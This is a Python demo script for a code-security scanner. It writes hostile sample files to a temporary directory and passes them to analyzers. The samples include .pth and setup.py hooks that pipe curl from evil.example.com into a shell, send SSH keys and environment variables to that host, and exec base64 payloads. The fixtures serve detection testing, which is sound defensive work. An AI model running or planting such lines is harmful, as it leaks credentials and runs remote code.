#!/usr/bin/env python3
"""Runnable launch and red-team demos for CodeGuard Pro."""

import json
from pathlib import Path
from tempfile import TemporaryDirectory

from agent_analyzer import analyze_setup_py, deep_analyze, smart_analyze
from supply_chain import scan_pip_package, scan_pth_files


def main() -> None:
    email_sample = "send_mail(request.form['subject'], body, 'noreply@example.com', [to])"
    setup_sample = """from setuptools import setup
from setuptools.command.install import install
import base64

class PostInstall(install):
    def run(self):
        install.run(self)
        exec(base64.b64decode('aW1wb3J0IG9zLHNvY2tldA=='))

setup(name="totally-legit", version="1.0", cmdclass={"install": PostInstall})
"""
    exfil_sample = """import os, urllib.request
data = str(dict(os.environ))
urllib.request.urlopen("http://evil.example.com/collect?d=" + data)
"""

    result = {
        "email_injection": smart_analyze(email_sample),
        "setup_behavior": analyze_setup_py(setup_sample),
        "credential_exfiltration": deep_analyze(exfil_sample),
    }
    print(json.dumps(result, indent=2))


def redteam_demo() -> None:
    """Run a mocked red-team benchmark without installing anything."""
    pth_samples = {
        "os_system.pth": 'import os; os.system("curl http://evil.example.com/x | sh")\n',
        "subprocess.pth": 'import subprocess; subprocess.run(["curl","-d","@~/.ssh/id_rsa","http://evil.example.com"])\n',
        "base64_exec.pth": 'import base64; exec(base64.b64decode("cHJpbnQoMSk="))\n',
        "requests_exfil.pth": 'import os,requests; requests.post("http://evil.example.com", data=os.environ)\n',
        "socket_exfil.pth": 'import socket,os;s=socket.socket();s.connect(("evil.example.com",443));s.send(str(dict(os.environ)).encode())\n',
        "compile_eval.pth": 'import base64; payload=compile(base64.b64decode("cHJpbnQoMSk="),"x","exec"); eval(payload)\n',
    }

    with TemporaryDirectory() as d:
        for name, content in pth_samples.items():
            Path(d, name).write_text(content)
        pth_result = scan_pth_files(d)

    package_results = {
        "litellm==1.82.8": scan_pip_package("litellm", requested_version="1.82.8"),
        "telnyx==4.87.2": scan_pip_package("telnyx", requested_version="4.87.2"),
        "requests==2.31.0": scan_pip_package("requests", requested_version="2.31.0"),
    }

    summary = {
        "mocked_install_persistence": {
            "samples": len(pth_samples),
            "blocked": len(pth_result.get("findings", [])),
            "verdict": pth_result.get("verdict"),
        },
        "pinned_package_verdicts": {
            spec: result.get("verdict")
            for spec, result in package_results.items()
        },
    }

    print(json.dumps({
        "summary": summary,
        "pth_corpus": pth_result,
        "package_checks": package_results,
    }, indent=2))


if __name__ == "__main__":
    main()
